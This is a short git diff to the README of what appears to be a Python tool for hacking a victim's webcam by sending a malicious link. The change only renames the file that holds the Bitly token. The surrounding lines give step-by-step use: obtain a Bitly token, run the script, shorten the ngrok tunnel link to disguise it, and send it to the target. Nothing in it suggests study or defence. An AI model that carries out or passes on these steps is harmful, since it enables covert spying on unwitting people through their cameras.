@@ -40,7 +40,7 @@ Hack webcam using python by sending malicious link.
 
 ## HOW TO USE :
 - You need to signup in [Bitly](https://bitly.com/a/sign_up) and get your **access token** in API session
-- Now in the project directory there is a file called `tokensbitly.py`, in that replace `your_token` with your access token
+- Now in the project directory there is a file called `constraints.py`, in that replace `your_token` with your access token
 - After running the script, it will ask if you want to shorten the ngrok link type `y` or else type `n`
 - you will be provided with **ngrok** tunnel link with or without shortened depending on what yoy have choosen
 - Send that link to Client 
